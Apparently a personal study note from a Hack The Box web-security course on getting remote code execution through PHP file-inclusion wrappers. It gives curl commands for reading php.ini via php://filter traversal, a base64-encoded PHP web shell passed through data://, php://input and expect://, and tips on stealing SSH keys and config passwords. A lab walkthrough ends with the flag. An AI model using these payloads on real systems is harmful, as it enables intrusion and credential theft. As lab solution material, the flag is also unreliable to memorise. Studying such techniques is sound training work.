---
tags: [CWES, HTB, technical-reference]
module: "File Inclusion"
source_file: "CWES.xmind"
---

# RCE via PHP Wrappers

> [!info] Complete technical reference
> Section imported without removing commands, hints, links, notes, or images.

## many methods to execute remote commands

### we may find the database password in a file like config.php

### check the .ssh directory in each user's home directory

- grab their private key (id_rsa) and use it to SSH into the system
## Data wrapper

### data wrapper can be used to include external data, including PHP code. However, the data wrapper is only available to use if the (allow_url_include) setting is enabled

- this option is not enabled by default
### Checking PHP Configurations

- Apache
  - /etc/php/X.Y/apache2/php.ini
- Nginx
  - /etc/php/X.Y/fpm/php.ini
    - where X.Y is your install PHP version
### use cURL or Burp

- curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
  - W1BIUF0KCjs7Ozs7Ozs7O..
- decode it and grep for allow_url_include to see its value
  - echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include
    - allow_url_include = On
### Remote Code Execution

- encode a basic PHP web shell
  - echo '<?<!-- -->php system($_GET["cmd"]); ?>' | base64
    - PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
### pass it to the data wrapper use pass commands to the web shell with &cmd=<COMMAND>:

- http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id
  - or use curl grep
    - curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep uid
  - uid=33(www-data)
## Input

### The difference between it and the data wrapper is that we pass our input to the input wrapper as a POST

- the vulnerable parameter must accept POST
  - curl -s -X POST --data '<?<!-- -->php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid
    - uid=33(www-data)
## Expect

### external wrapper, so it needs to be manually installed and enabled on the back-end server

### decode configuration file and check whether it is configured

- echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep expect
  - extension=expect
    - curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id" | grep uid
      - uid=33(www-data)
## LAB

### Try to gain RCE using one of the PHP wrappers and read the flag at /

- Get the php.ini source code
  - curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
    - W1BIUF0KCjs7Ozs7Ozs7O..
      - echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include
        - allow_url_include = On
- RCE
  - curl '154.57.164.67:31250/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id'
    - ...  
      uid=33(www-data)  
      ...
      - curl '154.57.164.67:31250/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=ls+/'
        - 37809e2f8952f06139011994726d9ef1.txt
          - curl '154.57.164.67:31250/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=cat+/37809e2f8952f06139011994726d9ef1.txt'
            - HTB{d!$46l3_r3m0t3_url_!nclud3}
